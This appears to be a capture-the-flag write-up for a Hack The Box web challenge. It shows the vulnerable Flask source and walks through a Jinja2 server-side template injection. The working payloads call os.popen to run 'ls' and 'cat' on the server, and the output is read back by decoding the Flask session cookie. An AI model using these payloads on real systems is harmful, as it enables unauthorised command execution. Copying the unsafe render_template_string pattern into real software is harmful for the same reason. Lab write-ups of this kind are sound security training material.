# baby ninja jinja

A form appears on the website. Since the entry did not appear to be vulnerable to SQL injection or any other attack.

If you see the source code `(crt + u)` of the page, such a thing is commented at the bottom of the page :
```html
</body>
<!-- /debug -->
</html>
```

> If we look at this path

`/debug` :
```python
from flask import Flask, session, render_template, request, Response, render_template_string, g
import functools, sqlite3, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(120)

acc_tmpl = '''{% extends 'index.html' %}
{% block content %}
<h3>baby_ninja joined, total number of rebels: reb_num<br>
{% endblock %}
'''

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/ninjas.db')
        db.isolation_level = None
        db.row_factory = sqlite3.Row
        db.text_factory = (lambda s: s.replace('{{', '').
            replace("'", '&#x27;').
            replace('"', '&quot;').
            replace('<', '&lt;').
            replace('>', '&gt;')
        )
    return db

def query_db(query, args=(), one=False):
    with app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], str(value)) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (rv[0] if rv else None) if one else rv

@app.before_first_request
def init_db():
    with app.open_resource('schema.sql', mode='r') as f:
        get_db().cursor().executescript(f.read())

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close()

def rite_of_passage(func):
    @functools.wraps(func)
    def born2pwn(*args, **kwargs):

        name = request.args.get('name', '')

        if name:
            query_db('INSERT INTO ninjas (name) VALUES ("%s")' % name)

            report = render_template_string(acc_tmpl.
                replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).
                replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())
            )

            if session.get('leader'): 
                return report

            return render_template('welcome.jinja2')
        return func(*args, **kwargs)
    return born2pwn

@app.route('/')
@rite_of_passage
def index():
    return render_template('index.html')

@app.route('/debug')
def debug():
    return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
```

# SSTI

This code shows that the name entry is inserted into a backend database and then extracted again from it to replace the substring `baby_ninja` in the `acc_tmpl` string, which is then passed to the `render_template_string` function.

The string acc_tmpl contains template blocks that are indicated by `{%" and the trailing "%}`. The challenge's name contains the word `Jinja`, which is a template language for Python.

The attack should consist of a `Server-Side Template Injection (SSTI)`. This is accomplished by inserting template blocks into our name parameter so that the template blocks are executed in the context of the backend server when rendering the template string.

* SSTI attacks on Jinja & Python
    * [Jinja2 SSTI](https://hackmd.io/@Chivato/HyWsJ31dI#References)
    * [Jinja2 SSTI](https://realpython.com/primer-on-jinja-templating/)

It was built as follows
```python
{%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=asdf&os=os&command=ls
```
The result of the above command cannot be displayed because it stores the result of the request in a cookie called a `session`
We must decode this cookie every time we send a request
```bash
flask-unsign --decode --cookie "eyJhc2RmIjp7IiBiIjoiWVhCd0xuQjVDbVpzWVdkZlVEVTBaV1FLYzJOb1pXMWhMbk54YkFwemRHRjBhV01LZEdWdGNHeGhkR1Z6Q2c9PSJ9fQ.YRQfrQ.HxMrG2AVH-UYqJ2LUUCVt8lEvDw"

{'asdf': b'app.py\nflag_P54ed\nschema.sql\nstatic\ntemplates\n'}
```
As you can see above, the name of the flag is clear so the next request is as follows:
```python
{%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=asdf&os=os&command=cat flag_P54ed
```
If we decode the session cookie twice, the flag is visible
```
flask-unsign --decode --cookie [COOKIE]
{'asdf': b'HTB{b4by_ninj4s_****_***_******_**_******}\n'}
```